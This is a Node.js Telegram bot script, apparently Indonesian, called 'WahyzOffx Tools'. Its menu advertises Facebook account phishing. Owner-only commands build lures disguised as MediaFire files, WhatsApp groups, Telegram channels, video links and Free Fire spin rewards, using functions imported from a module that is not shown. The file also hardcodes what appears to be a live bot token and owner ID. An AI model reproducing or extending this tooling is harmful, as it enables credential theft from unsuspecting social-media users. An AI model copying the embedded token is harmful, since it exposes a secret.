const { Telegraf } = require("telegraf")
const { mediafire, groupwa, ch, videy, spinff, videy2, mediafire2, groupwa2, ch2, spinff2 } = require("./a.js")
const config = {
boToken: "8446589089:AAHxOTRf0VT81YurbrtFZDQYOIVVoRDRHaY",
ownerId: "8310674333"
}

async function startBot() {
const bot = new Telegraf(config.boToken)
bot.start(async (ctx) => {
ctx.reply(`\`\`\` [ WahyzOffx Tools ]\n> Name: WahyzOffx Tools\n> Creator: LezzDcodeR\n> Library: Telegraf\n> Version: 1\n\n [ MENU 1 ]\n> mediafire <nama_file>\n> groupwa <nama_group>\n> chtelegram <nama_chanel>\n> videy\n> spinff\n\n [ MENU 2 (PHISING FACEBOOK ACOUNT)]\n> mediafire2 <nama_file>\n> groupwa2 <nama_group>\n> chtelegram2 <nama_ch>\n> spinff2\n> videy2 \`\`\``, {parse_mode:"Markdown"})
})
bot.command("mediafire", async (ctx) => {
if (String(ctx.from.id) !== config.ownerId) return ctx.reply("Owner Only")
const text = ctx.message.text.split(" ").slice(1).join(" ")
if (!text) return ctx.reply("Example: /mediafire <nama_video>")
mediafire(ctx, config.boToken, ctx.from.id, text)
})
bot.command("groupwa", async (ctx) => {
if (String(ctx.from.id) !== config.ownerId) return ctx.reply("Owner Only")
const text = ctx.message.text.split(" ").slice(1).join(" ")
if (!text) return ctx.reply("Example: /groupwa <nama_group>")
await groupwa(ctx, config.boToken, ctx.from.id, text)
})
bot.command("chtelegram", async (ctx) => {
if (String(ctx.from.id) !== config.ownerId) return ctx.reply("Owner Only")
const text = ctx.message.text.split(" ").slice(1).join(" ")
if (!text) return ctx.reply("Example: /chtelegram <nama_chanel>")
await ch(ctx, config.boToken, ctx.from.id, text)
})
bot.command("videy", async (ctx) => {
if (String(ctx.from.id) !== config.ownerId) return ctx.reply("Owner Only")
await videy(ctx, config.boToken, ctx.from.id)
})
bot.command("spinff", async (ctx) => {
if (String(ctx.from.id) !== config.ownerId) return ctx.reply("Owner Only")
await spinff(ctx, config.boToken, ctx.from.id)
})
bot.command("mediafire2", async (ctx) => {
if (String(ctx.from.id) !== config.ownerId) return ctx.reply("Owner Only")
const text = ctx.message.text.split(" ").slice(1).join(" ")
if (!text) return ctx.reply("Example: /mediafire <nama_file>")
mediafire2(ctx, config.boToken, ctx.from.id, text)
})
bot.command("groupwa2", async (ctx) => {
if (String(ctx.from.id) !== config.ownerId) return ctx.reply("Owner Only")
const text = ctx.message.text.split(" ").slice(1).join(" ")
if (!text) return ctx.reply("Example: /groupwa <nama_group>")
await groupwa2(ctx, config.boToken, ctx.from.id, text)
})
bot.command("chtelegram2", async (ctx) => {
if (String(ctx.from.id) !== config.ownerId) return ctx.reply("Owner Only")
const text = ctx.message.text.split(" ").slice(1).join(" ")
if (!text) return ctx.reply("Example: /chtelegram <nama_chanel>")
await ch2(ctx, config.boToken, ctx.from.id, text)
})
bot.command("videy2", async (ctx) => {
if (String(ctx.from.id) !== config.ownerId) return ctx.reply("Owner Only")
await videy2(ctx, config.boToken, ctx.from.id)
})
bot.command("spinff2", async (ctx) => {
if (String(ctx.from.id) !== config.ownerId) return ctx.reply("Owner Only")
await spinff2(ctx, config.boToken, ctx.from.id)
})
bot.launch()
console.log("Bot Sedang Berjalan...")
}
startBot()
